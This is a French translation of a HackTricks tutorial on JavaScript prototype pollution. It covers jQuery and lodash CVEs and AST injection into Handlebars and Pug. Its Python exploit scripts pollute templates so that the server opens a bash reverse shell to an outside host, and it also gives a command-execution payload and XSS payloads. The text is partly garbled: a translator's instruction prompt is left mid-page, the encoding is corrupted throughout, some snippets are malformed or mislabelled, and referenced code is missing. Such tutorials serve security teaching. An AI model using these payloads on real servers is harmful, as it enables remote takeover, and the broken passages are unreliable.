## Objets en JavaScript <a href="#053a" id="053a"></a>

Tout d'abord, nous devons comprendre `Object`en JavaScript. Un objet est simplement une collection de paires cl√©-valeur, souvent appel√©es propri√©t√©s de cet objet. Par exemple:

![](<../../../.gitbook/assets/image (389) (1).png>)

En JavaScript, `Object`est un objet de base, le mod√®le pour tous les objets nouvellement cr√©√©s. Il est possible de cr√©er un objet vide en passant `null`√† `Object.create`. Cependant, le nouvel objet cr√©√© aura √©galement un type qui correspond au param√®tre pass√© et h√©rite de toutes les propri√©t√©s de base.
```javascript
console.log(Object.create(null)); // prints an empty object
```
![](<../../../.gitbook/assets/image (360).png>)

Pr√©c√©demment, nous avons appris qu'un objet en javascript est une collection de cl√©s et de valeurs, il est donc logique qu'un objet `null` soit simplement un dictionnaire vide : `{}`.

## Fonctions / Classes en Javascript <a href="#55dd" id="55dd"></a>

En Javascript, les concepts de classe et de fonction sont assez interd√©pendants (la fonction elle-m√™me agit en tant que constructeur pour la classe et la nature r√©elle n'a pas de concept de "classe" en javascript). Voyons l'exemple suivant :
```javascript
function person(fullName, age) {
    this.age = age;
    this.fullName = fullName;
    this.details = function() {
        return this.fullName + " has age: " + this.age;
    }
}
```
![](<../../../.gitbook/assets/image (361).png>)

Vous √™tes un hacker professionnel, traducteur et √©crivain. Vous √©crivez tout de mani√®re tr√®s claire et aussi concise que possible sans perdre d'informations. Le contenu suivant est extrait d'un livre de piratage sur les techniques de piratage de cloud, de plateformes SaaS, de CI/CD... Le contenu suivant provient du fichier /hive/hacktricks/pentesting-web/deserialization/nodejs-proto-prototype-pollution/README.md. Traduisez le texte anglais pertinent en fran√ßais et renvoyez la traduction en conservant la syntaxe markdown. Ne traduisez pas les choses comme le code, les noms de techniques de piratage, les noms de plateformes cloud/SaaS (comme Workspace, aws, gcp...), le mot 'leak' et les balises markdown. N'ajoutez √©galement rien d'autre que la traduction et la syntaxe markdown.
```javascript
var person1 = new person("Satoshi", 70);
```
![](<../../../.gitbook/assets/image (362).png>)

## Prototypes en JavaScript <a href="#3843" id="3843"></a>

Il convient de noter que l'attribut prototype peut √™tre modifi√©/supprim√© lors de l'ex√©cution du code. Par exemple, des fonctions peuvent √™tre ajout√©es dynamiquement √† la classe :

![](<../../../.gitbook/assets/image (363).png>)

Les fonctions de la classe peuvent √©galement √™tre modifi√©es (comme `toString` ou `valueOf` dans les cas suivants) :

![](<../../../.gitbook/assets/image (364).png>)

![](<../../../.gitbook/assets/image (365).png>)

## H√©ritage

Dans un programme bas√© sur des prototypes, les objets h√©ritent des propri√©t√©s/m√©thodes des classes. Les classes sont d√©riv√©es en ajoutant des propri√©t√©s/m√©thodes √† une instance d'une autre classe ou en les ajoutant √† un objet vide.

Notez que si vous ajoutez une propri√©t√© √† un objet qui est utilis√© comme prototype pour un ensemble d'objets (comme myPersonObj), les objets pour lesquels il est le prototype obtiennent √©galement la nouvelle propri√©t√©, mais cette propri√©t√© n'est pas imprim√©e √† moins d'√™tre sp√©cifiquement appel√©e.

![](<../../../.gitbook/assets/image (366).png>)

## Pollution de \_\_proto\_\_ <a href="#0d0a" id="0d0a"></a>

Vous devriez d√©j√† savoir que **chaque objet en JavaScript est simplement une collection de paires cl√©-valeur** et que **chaque objet h√©rite du type Object en JavaScript**. Cela signifie que si vous √™tes capable de polluer le type Object, **chaque objet JavaScript de l'environnement sera pollu√© !**

C'est assez simple, il vous suffit de pouvoir modifier certaines propri√©t√©s (paires cl√©-valeur) d'un objet JavaScript arbitraire, car chaque objet h√©rite du sch√©ma Object.
```javascript
function person(fullName) {
    this.fullName = fullName;
}
var person1 = new person("Satoshi");
```
√Ä partir de l'exemple pr√©c√©dent, il est possible d'acc√©der √† la structure de l'objet en utilisant les m√©thodes suivantes :
```javascript
person1.__proto__.__proto__
person.__proto__.__proto__
```
Ainsi, comme mentionn√© pr√©c√©demment, si une propri√©t√© est ajout√©e au sch√©ma d'objet, chaque objet JavaScript aura acc√®s √† la nouvelle propri√©t√©:
```javascript
function person(fullName) {
    this.fullName = fullName;
}
var person1 = new person("Satoshi");
//Add function as new property
person1.__proto__.__proto__.printHello = function(){console.log("Hello");}
person1.printHello() //This now works and prints hello
//Add constant as new property
person1.__proto__.__proto__.globalconstant = true
person1.globalconstant  //This now works and is "true"
```
Maintenant, chaque objet JS contiendra les nouvelles propri√©t√©s : la fonction `printHello` et la nouvelle constante `globalconstant`.

## Pollution de prototype

Cette technique n'est pas aussi efficace que la pr√©c√©dente car vous ne pouvez pas polluer le sch√©ma de l'objet JS. Mais dans les cas o√π le mot-cl√© `__proto__` est interdit, cette technique peut √™tre utile.

Si vous √™tes capable de modifier les propri√©t√©s d'une fonction, vous pouvez modifier la propri√©t√© `prototype` de la fonction et **chaque nouvelle propri√©t√© que vous ajoutez ici sera h√©rit√©e par chaque objet cr√©√© √† partir de cette fonction :**
```javascript
function person(fullName) {
    this.fullName = fullName;
}
var person1 = new person("Satoshi");
//Add function as new property
person.prototype.sayHello = function(){console.log("Hello");}
person1.sayHello() //This now works and prints hello
//Add constant as new property
person.prototype.newConstant = true
person1.newConstant //This now works and is "true"

//The same could be achieved using this other way:
person1.constructor.prototype.sayHello = function(){console.log("Hello");}
person1.constructor.prototype.newConstant = true
```
Dans ce cas, seuls les **objets cr√©√©s √† partir de la classe `person`** seront affect√©s, mais chacun d'entre eux h√©ritera d√©sormais des propri√©t√©s `sayHello` et `newConstant`.

Il y a 2 fa√ßons d'exploiter la pollution de prototype pour contaminer CHAQUE objet JS.

La premi√®re consiste √† polluer le prototype de propri√©t√© de **Object** (comme mentionn√© pr√©c√©demment, chaque objet JS h√©rite de celui-ci) :
```javascript
Object.prototype.sayBye = function(){console.log("bye!")}
```
Si vous parvenez √† le faire, chaque objet JS pourra ex√©cuter la fonction `sayBye`.

L'autre m√©thode consiste √† polluer le prototype d'un constructeur d'une variable de dictionnaire comme dans l'exemple suivant:
```javascript
something = {"a": "b"}
something.constructor.prototype.sayHey = function(){console.log("Hey!")}
```
Apr√®s l'ex√©cution de ce code, **chaque objet JS sera capable d'ex√©cuter la fonction `sayHey`**.

## Pollution d'autres objets

### D'une classe √† Object.prototype

Dans un sc√©nario o√π vous pouvez **polluer un objet sp√©cifique** et que vous devez **atteindre `Object.prototype`**, vous pouvez le rechercher avec quelque chose comme le code suivant:
```javascript
// From https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/

// Search from "window" object
for(let key of Object.getOwnPropertyNames(window)) {
  if (window[key]?.constructor.prototype === Object.prototype) {
    console.log(key)
  }
}

// Imagine that the original object was document.querySelector('a')
// With this code you could find some attributes to get the object "window" from that one
for(let key1 in document.querySelector('a')) {
  for(let key2 in document.querySelector('a')[key1]) {
    if (document.querySelector('a')[key1][key2] === window) {
      console.log(key1 + "." + key2)
    }
  }
}
```
### Pollution des √©l√©ments d'un tableau

Notez que comme vous pouvez polluer les attributs des objets en JS, si vous avez acc√®s pour polluer un tableau, vous pouvez √©galement **polluer les valeurs du tableau** accessibles **par index** (notez que vous ne pouvez pas √©craser les valeurs, vous devez donc polluer les index qui sont utilis√©s d'une mani√®re ou d'une autre mais pas √©crits).
```javascript
c = [1,2]
a = []
a.constructor.prototype[1] = "yolo"
b = []
b[0] //undefined
b[1] //"yolo"
c[1] // 2 -- not
```
### Pollution des √©l√©ments HTML

Lors de la g√©n√©ration d'un √©l√©ment HTML via JS, il est possible de **remplacer** l'attribut **`innerHTML`** pour √©crire du **code HTML arbitraire**. [Id√©e et exemple tir√©s de cet article](https://blog.huli.tw/2022/04/25/en/intigriti-0422-xss-challenge-author-writeup/).

{% code overflow="wrap" %}
```javascript
// Create element
devSettings["root"] = document.createElement('main')

// Pollute innerHTML
settings[root][innerHTML]=<"svg onload=alert(1)>"

// Pollute innerHTML of the ownerProperty to avoid overwrites of innerHTML killing the payload
settings[root][ownerDocument][body][innerHTML]="<svg onload=alert(document.domain)>"
```
{% endcode %}

## Exemples

### Exemple de base

Alors o√π se trouve la pollution de prototype ? Elle se produit lorsqu'il y a un bug dans l'application qui permet de remplacer les propri√©t√©s de `Object.prototype`. √âtant donn√© que chaque objet typique h√©rite de ses propri√©t√©s de `Object.prototype`, nous pouvons modifier le comportement de l'application. L'exemple le plus couramment pr√©sent√© est le suivant :
```javascript
if (user.isAdmin) {   // do something important!}
```
Imaginez que nous avons une pollution de prototype qui permet de d√©finir `Object.prototype.isAdmin = true`. Ensuite, √† moins que l'application n'ait explicitement attribu√© une valeur, `user.isAdmin` est toujours vrai !

![](https://research.securitum.com/wp-content/uploads/sites/2/2019/10/image-1.png)

Par exemple, `obj[a][b] = value`. Si l'attaquant peut contr√¥ler la valeur de `a` et `value`, alors il suffit de r√©gler la valeur de `a` sur `__proto__` (en javascript, `obj["__proto__"]` et `obj.__proto__` sont compl√®tement √©quivalents) puis la propri√©t√© `b` de tous les objets existants dans l'application sera attribu√©e √† `value`.

Cependant, l'attaque n'est pas aussi simple que celle d√©crite ci-dessus, selon [le document](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript\_prototype\_pollution\_attack\_in\_NodeJS.pdf), nous ne pouvons attaquer que lorsque l'une des trois conditions suivantes est remplie :

* Effectuer une fusion r√©cursive
* D√©finition de propri√©t√© par chemin
* Cloner un objet

### Remplacement de fonction
```python
customer.__proto__.toString = ()=>{alert("polluted")}
```
### Pollution de prototype pour RCE

{% content-ref url="prototype-pollution-to-rce.md" %}
[prototype-pollution-to-rce.md](prototype-pollution-to-rce.md)
{% endcontent-ref %}

## Pollution de prototype c√¥t√© client pour XSS

{% content-ref url="client-side-prototype-pollution.md" %}
[client-side-prototype-pollution.md](client-side-prototype-pollution.md)
{% endcontent-ref %}

### CVE-2019‚Äì11358: Attaque de pollution de prototype via jQuery $ .extend

$ .extend, s'il est mal g√©r√©, peut changer les propri√©t√©s de l'objet `prototype` (le mod√®le des objets dans l'application). Cet attribut appara√Ætra alors sur tous les objets. Notez que seule la version "profonde" (c'est-√†-dire g) de $ .extened est affect√©e.

Les programmeurs utilisent souvent cette fonction pour dupliquer un objet ou remplir de nouvelles propri√©t√©s √† partir d'un objet par d√©faut. Par exemple:

Nous pouvons imaginer que `myObject` est un champ d'entr√©e de l'utilisateur et est s√©rialis√© dans la base de donn√©es)

Dans ce code, nous pensons souvent, lors de l'ex√©cution, que l'attribut `isAdmin` sera affect√© au nouvel objet cr√©√©. Mais essentiellement, il est affect√© directement √† `{}` et ensuite `{}.isAdmin` sera `true`. Si apr√®s ce code, nous effectuons la v√©rification suivante:
```javascript
If (user.isAdmin === true) {
    // do something for admin
}
```
Si l'utilisateur n'existe pas encore (`undefined`), la propri√©t√© `isAdmin` sera recherch√©e dans son objet parent, qui est l'objet ajout√© `isAdmin` avec la valeur `true` ci-dessus.

Un autre exemple lorsqu'il est ex√©cut√© sur JQuery 3.3.1:
```javascript
$.extend(true, {}, JSON.parse('{"__proto__": {"devMode": true}}'))
console.log({}.devMode); // true
```
Ces erreurs peuvent affecter de nombreux projets Javascript, en particulier les projets NodeJS, l'exemple le plus pratique √©tant l'erreur de Mongoose, la biblioth√®que JS qui aide √† manipuler MongoDB, en d√©cembre 2018.

### CVE-2018-3721, CVE-2019-10744: Attaque de pollution de prototype via lodash

[Lodash](https://www.npmjs.com/package/lodash) est √©galement une biblioth√®que bien connue qui fournit de nombreuses fonctions diff√©rentes, nous aidant √† √©crire du code de mani√®re plus pratique et plus soign√©e avec plus de 19 millions de t√©l√©chargements hebdomadaires. Et il a eu le m√™me probl√®me que JQuery.

**CVE-2018-3721**

**CVE-2019-10744**

Ce bogue affecte toutes les versions de Lodash, d√©j√† corrig√© dans la version 4.17.11.

### Un autre tutoriel avec des CVE

{% embed url="https://infosecwriteups.com/javascript-prototype-pollution-practice-of-finding-and-exploitation-f97284333b2" %}

## Pollution de prototype AST

En NodeJS, AST est utilis√© en JS tr√®s souvent, comme les moteurs de template et TypeScript, etc.\
Pour le moteur de template, la structure est comme indiqu√© ci-dessus.

![img](https://blog.p6.is/img/2020/08/graph\_3.jpg)

### Handlebars

Info prise sur [https://blog.p6.is/AST-Injection/](https://blog.p6.is/AST-Injection/)

Vous pouvez ins√©rer n'importe quelle cha√Æne dans `Object.prototype.pendingContent` pour d√©terminer la possibilit√© d'une attaque.\
Cela vous permet de vous assurer que les serveurs utilisent le moteur de Handlebars lorsqu'une pollution de prototype existe dans un environnement de bo√Æte noire.
```javascript
<!-- /node_modules/handlebars/dist/cjs/handlebars/compiler/javascript-compiler.js -->

...
appendContent: function appendContent(content) {
	if (this.pendingContent) {
		content = this.pendingContent + content;
	} else {
		this.pendingLocation = this.source.currentLocation;
	}

	this.pendingContent = content;
},
pushSource: function pushSource(source) {
	if (this.pendingContent) {
		this.source.push(this.appendToBuffer(this.source.quotedString(this.pendingContent), this.pendingLocation));
		this.pendingContent = undefined;
	}

	if (source) {
		this.source.push(source);
	}
}
...
```
Cela est r√©alis√© par la fonction `appendContent` de `javascript-compiler.js`.\
`appendContent` est comme suit. Si `pendingContent` est pr√©sent, il est ajout√© au contenu et renvoy√©.

`pushSource` rend `pendingContent` ind√©fini, emp√™chant ainsi la cha√Æne d'√™tre ins√©r√©e plusieurs fois.

**Exploitation**

![img](https://blog.p6.is/img/2020/08/graph\_5.jpg)

Handlebars fonctionne comme indiqu√© dans le graphique ci-dessus.

Apr√®s la g√©n√©ration de l'AST par le lexer et le parser, il est transmis √† `compiler.js`.\
Nous pouvons ex√©cuter la fonction de mod√®le g√©n√©r√©e par le compilateur avec certains arguments. Et cela renvoie la cha√Æne comme "Bonjour posix" (lorsque msg est posix).
```javascript
<!-- /node_modules/handlebars/dist/cjs/handlebars/compiler/parser.js -->

case 36:
    this.$ = { type: 'NumberLiteral', value: Number($$[$0]), original: Number($$[$0]), loc: yy.locInfo(this._$) };
    break;
```
Le parseur de Handlebars force la valeur d'un n≈ìud dont le type est NumberLiteral √† √™tre toujours un nombre gr√¢ce au constructeur Number. Cependant, il est possible d'ins√©rer une cha√Æne non num√©rique ici en utilisant la pollution de prototype.
```javascript
<!-- /node_modules/handlebars/dist/cjs/handlebars/compiler/base.js -->

function parseWithoutProcessing(input, options) {
  // Just return if an already-compiled AST was passed in.
  if (input.type === 'Program') {
    return input;
  }

  _parser2['default'].yy = yy;

  // Altering the shared object here, but this is ok as parser is a sync operation
  yy.locInfo = function (locInfo) {
    return new yy.SourceLocation(options && options.srcName, locInfo);
  };

  var ast = _parser2['default'].parse(input);

  return ast;
}

function parse(input, options) {
  var ast = parseWithoutProcessing(input, options);
  var strip = new _whitespaceControl2['default'](options);

  return strip.accept(ast);
}
```
Tout d'abord, regardez la fonction de compilation, elle prend en charge deux fa√ßons d'entr√©e, l'objet AST et la cha√Æne de mod√®le.

Lorsque le type d'entr√©e est un `Program`, bien que la valeur d'entr√©e soit en r√©alit√© une cha√Æne de caract√®res.\
Le parseur consid√®re qu'elle est d√©j√† analys√©e en AST par parser.js et l'envoie au compilateur sans aucun traitement.
```javascript
<!-- /node_modules/handlebars/dist/cjs/handlebars/compiler/compiler.js -->

...
accept: function accept(node) {
    /* istanbul ignore next: Sanity code */
    if (!this[node.type]) {
        throw new _exception2['default']('Unknown type: ' + node.type, node);
    }

    this.sourceNode.unshift(node);
    var ret = this[node.type](node);
    this.sourceNode.shift();
    return ret;
},
Program: function Program(program) {
    console.log((new Error).stack)
    this.options.blockParams.unshift(program.blockParams);

    var body = program.body,
        bodyLength = body.length;
    for (var i = 0; i < bodyLength; i++) {
        this.accept(body[i]);
    }

    this.options.blockParams.shift();

    this.isSimple = bodyLength === 1;
    this.blockParams = program.blockParams ? program.blockParams.length : 0;

    return this;
}
```
Le compilateur prend l'objet AST (en fait une cha√Æne de caract√®res) et l'envoie √† la m√©thode `accept`.\
`accept` appelle `this[node.type]` du compilateur.\
Ensuite, il prend l'attribut `body` de l'AST et l'utilise pour construire une fonction.
```javascript
const Handlebars = require('handlebars');

Object.prototype.type = 'Program';
Object.prototype.body = [{
    "type": "MustacheStatement",
    "path": 0,
    "params": [{
        "type": "NumberLiteral",
        "value": "console.log(process.mainModule.require('child_process').execSync('id').toString())"
    }],
    "loc": {
        "start": 0,
        "end": 0
    }
}];


const source = `Hello {{ msg }}`;
const template = Handlebars.precompile(source);

console.log(eval('(' + template + ')')['main'].toString());

/*
function (container, depth0, helpers, partials, data) {
    var stack1, lookupProperty = container.lookupProperty || function (parent, propertyName) {
        if (Object.prototype.hasOwnProperty.call(parent, propertyName)) {
            return parent[propertyName];
        }
        return undefined
    };

    return ((stack1 = (lookupProperty(helpers, "undefined") || (depth0 && lookupProperty(depth0, "undefined")) || container.hooks.helperMissing).call(depth0 != null ? depth0 : (container.nullContext || {}), console.log(process.mainModule.require('child_process').execSync('id').toString()), {
        "name": "undefined",
        "hash": {},
        "data": data,
        "loc": {
            "start": 0,
            "end": 0
        }
    })) != null ? stack1 : "");
}
*/
```
En cons√©quence, une attaque peut √™tre configur√©e comme ceci. Si vous avez parcouru l'analyseur syntaxique, sp√©cifiez une cha√Æne qui ne peut pas √™tre assign√©e √† la valeur de NumberLiteral. Mais une fois que l'AST inject√© est trait√©, nous pouvons ins√©rer n'importe quel code dans la fonction.

**Exemple**

[https://github.com/hughsk/flat/issues/105](https://github.com/hughsk/flat/issues/105)
```python
import requests

TARGET_URL = 'http://p6.is:3000'

# make pollution
requests.post(TARGET_URL + '/vulnerable', json = {
    "__proto__.type": "Program",
    "__proto__.body": [{
        "type": "MustacheStatement",
        "path": 0,
        "params": [{
            "type": "NumberLiteral",
            "value": "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/p6.is/3333 0>&1'`)"
        }],
        "loc": {
            "start": 0,
            "end": 0
        }
    }]
})

# execute
requests.get(TARGET_URL)
```
### Pug

Plus d'informations sur [https://blog.p6.is/AST-Injection/#Pug](https://blog.p6.is/AST-Injection/#Pug)
```python
import requests

TARGET_URL = 'http://p6.is:3000'

# make pollution
requests.post(TARGET_URL + '/vulnerable', json = {
    "__proto__.block": {
        "type": "Text", 
        "line": "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/p6.is/3333 0>&1'`)"
    }
})

# execute
requests.get(TARGET_URL)
```
## Comment puis-je pr√©venir?

* Geler les propri√©t√©s avec Object.freeze (Object.prototype)
* Effectuer une validation sur les entr√©es JSON conform√©ment au sch√©ma de l'application
* √âviter d'utiliser des fonctions de fusion r√©cursives de mani√®re non s√©curis√©e
* Utiliser des objets sans propri√©t√©s de prototype, tels que `Object.create(null)`, pour √©viter d'affecter la cha√Æne de prototype
* Utiliser `Map` au lieu de `Object`
* Mettre r√©guli√®rement √† jour les nouveaux correctifs pour les biblioth√®ques

## R√©f√©rence

* [https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/](https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/)
* [https://dev.to/caffiendkitten/prototype-inheritance-pollution-2o5l](https://dev.to/caffiendkitten/prototype-inheritance-pollution-2o5l)
* [https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7](https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Travaillez-vous dans une entreprise de **cybers√©curit√©**? Voulez-vous voir votre **entreprise annonc√©e dans HackTricks**? ou voulez-vous avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF**? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
